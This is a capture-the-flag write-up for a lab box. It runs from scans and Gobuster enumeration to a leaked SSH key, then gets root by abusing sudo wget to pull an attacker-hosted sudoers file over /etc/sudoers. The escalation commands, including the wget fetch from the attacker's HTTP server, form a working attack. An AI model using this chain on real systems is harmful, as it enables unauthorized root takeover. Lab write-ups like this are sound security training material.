## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
can you exfiltrate the root flag?
```
## IP-Address
```IP-Address
10.49.171.194
```
## Rust-Scan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Gobuster
```bash
$ gobuster dir \
-u http://10.49.171.194/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-x php,html,txt \
-t 50

/sitemap              (Status: 301) [Size: 316] [--> http://10.49.171.194/sitemap/]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 278]

```
- Explore more in `/sitemap`
```bash
$ gobuster dir \
-u http://10.49.171.194/sitemap \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
-x php,html,txt \
-t 50

/.ssh       (Status: 301) [Size: 321] [--> http://10.49.171.194/sitemap/.ssh/]
```
- Got the `/.ssh` and in that we got `id_rsa` & need `username`
```html
 <!-- Jessie don't forget to udate the webiste -->
```
- Got this comment at the first page source `http://10.49.171.194/`
- Login using `id_rsa`
```bash
ssh -i id_rsa jessie@10.49.171.194
jessie@CorpOne:~$
```
- Explore
```bash
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Desktop/
jessie@CorpOne:~/Desktop$ ls
jessie@CorpOne:~/Desktop$ ls -la
total 8
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 .
drwxr-xr-x 17 jessie jessie 4096 oct 26  2019 ..
jessie@CorpOne:~/Desktop$ cd ..
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
[flag/hash omitted]
```
## User Flag
```Flag
[flag/hash omitted]
```

---
## Privilege Escaltion
```bash
 jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
- Escalation - on `Attacker Machine`
```bash
echo 'jessie ALL=(ALL) NOPASSWD:ALL' > sudoers
python3 -m http.server 8000
```
- On `Target Machine`
```bash
sudo /usr/bin/wget http://192.168.157.252:8000/sudoers -O /etc/sudoers
sudo su
root@CorpOne:/home/jessie/Documents#
```
- Got the Root Shell
```bash
whoami
root
cd
ls
root_flag.txt
cat root_flag.txt
[flag/hash omitted]
```
## Root Flag
```Flag
[flag/hash omitted]
```

## END